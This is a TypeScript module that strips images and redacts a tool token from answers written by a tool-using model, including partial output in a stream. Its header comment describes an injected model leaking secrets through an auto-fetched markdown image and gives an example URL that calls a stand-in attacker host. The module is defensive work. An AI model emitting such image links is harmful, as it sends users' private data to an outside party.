/**
 * An answer that was written with the ADK's tools in reach was written by a model that read private
 * data and text nobody vetted. The screen that renders it is a way out for that data: an image such
 * as ![x](https://attacker.example/?q=<secret>) is fetched the moment the answer is shown, with no
 * click. So such an answer carries no images, and never the token of the tools.
 */

const INLINE_IMAGE = /!\[([^\]]*)\]\([^)]*\)/g;
const REFERENCE_IMAGE = /!\[([^\]]*)\]\[[^\]]*\]/g;
const HTML_IMAGE = /<img\b[^>]*>/gi;
const CLOSED_MARKDOWN_IMAGE = /^!\[[^\]]*\](?:\([^)]*\)|\[[^\]]*\])/;

export const REDACTED = '[redacted]';

/** The alt text stays, so the answer still reads; the picture, and with it the request, goes. */
export function stripImages(text: string): string {
  return text.replace(INLINE_IMAGE, '$1').replace(REFERENCE_IMAGE, '$1').replace(HTML_IMAGE, '');
}

export function redactToken(text: string, token: string): string {
  return token ? text.split(token).join(REDACTED) : text;
}

/** What an answer written with tools may show. */
export function sanitizeToolOutput(text: string, token: string): string {
  return redactToken(stripImages(text), token);
}

/**
 * Where something that is not finished begins, or the length of the text when nothing is: an image
 * still being written, or the token cut in two. A stream must not send past it, because what is
 * sent cannot be taken back once the rest arrives.
 */
export function unfinishedStart(text: string, token: string): number {
  let start = text.length;
  const markdown = text.lastIndexOf('![');
  if (markdown >= 0 && !CLOSED_MARKDOWN_IMAGE.test(text.slice(markdown))) start = markdown;
  const html = text.toLowerCase().lastIndexOf('<img');
  if (html >= 0 && text.indexOf('>', html) < 0) start = Math.min(start, html);
  // The first characters of an image at the very end ("!", "<im"): the rest may be about to arrive.
  const lower = text.toLowerCase();
  for (const marker of ['![', '<img']) {
    for (let size = marker.length - 1; size > 0; size -= 1) {
      if (lower.endsWith(marker.slice(0, size))) {
        start = Math.min(start, text.length - size);
        break;
      }
    }
  }
  // The beginning of the token at the very end: the rest of it may be about to arrive.
  for (let size = Math.min(token.length - 1, text.length); size > 0; size -= 1) {
    if (text.endsWith(token.slice(0, size))) {
      start = Math.min(start, text.length - size);
      break;
    }
  }
  return start;
}
